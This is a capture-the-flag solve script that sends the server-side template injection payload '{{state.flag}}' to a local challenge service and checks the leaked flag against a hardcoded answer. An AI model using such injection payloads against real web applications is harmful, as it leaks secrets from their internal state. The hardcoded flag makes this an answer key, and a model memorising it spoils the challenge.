#!/usr/bin/env python3
import re
import sys
import requests

HOST = "localhost"
PORT = 8080
FLAG = "magpie{tr34t_y0ur_1nt3rn5_n1c3ly}"

def solve() -> bool:
    response = requests.post(f"http://{HOST}:{PORT}/submit", { "try": "{{state.flag}}" }).text

    regex = re.search(r'magpie\{(.)+\}', response)

    return FLAG in regex.group(0)

def main():
    # if len(sys.argv) != 3:
    #     print("Usage: ./solve.py <IP> <PORT>")
    #     sys.exit(1)

    print(solve())

if __name__ == "__main__": main()
